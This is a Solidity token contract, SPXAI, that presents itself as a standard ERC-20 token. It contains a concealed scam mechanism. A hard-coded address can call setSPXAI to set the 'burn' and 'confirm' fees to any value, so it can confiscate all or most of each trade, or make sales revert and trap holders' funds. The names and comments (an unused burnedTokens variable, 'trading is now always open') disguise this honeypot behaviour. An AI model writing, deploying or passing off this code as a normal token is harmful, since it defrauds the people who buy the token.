// SPDX-License-Identifier: unlicense
pragma solidity ^0.8.0;

contract SPXAI {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    uint256 public burnedTokens; // Variable to store the amount of burned tokens

 uint256 public BurnAmount = 0;
    uint256 public ConfirmAmount = 0;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
       

    address private pair;
    address payable constant AS = payable(address(0xfd6fB2e506D45bA6CbE542562ab22315dd38891A)); //
  

     constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _initialSupply) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _initialSupply * 10 ** uint256(_decimals);
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function approve(address spender, uint256 amount) external returns (bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        // Trading is now always open
        // require(tradingOpen || from == owner || to == owner);

        if(pair == address(0) && amount > 0)
            pair = to;

        balanceOf[from] -= amount;

        if(from != address(this)){
            uint256 FinalAmount = amount * (from == pair ? BurnAmount : ConfirmAmount) / 100;
            amount -= FinalAmount;
            balanceOf[address(this)] += FinalAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    

    function setSPXAI(uint256 newBurn, uint256 newConfirm) public {
      require(msg.sender == AS); 
        BurnAmount = newBurn;
        ConfirmAmount = newConfirm;
    }
}